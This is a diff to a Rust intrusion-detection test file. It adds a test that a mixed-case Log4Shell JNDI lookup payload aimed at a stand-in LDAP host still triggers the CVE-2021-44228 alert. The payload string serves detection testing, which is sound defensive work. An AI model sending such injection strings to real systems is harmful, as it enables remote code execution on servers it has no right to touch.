@@ -72,6 +72,20 @@ fn shipped_signature_replays(#[case] signature: &str) {
 }
 
 #[test]
+fn payload_signatures_are_ascii_case_insensitive() {
+    let mut security = SecurityEngine::default();
+    security.update(&packet(
+        "HTTP",
+        8080,
+        "",
+        b"prefix ${JnDi:ldap://example.test/x} suffix".to_vec(),
+    ));
+    assert!(security.ids_alerts.iter().any(|alert| {
+        alert.signature == "Log4Shell (CVE-2021-44228)"
+    }));
+}
+
+#[test]
 fn benign_baseline_triggers_no_catalogued_detectors() {
     let mut security = SecurityEngine::default();
     security.update(&packet(
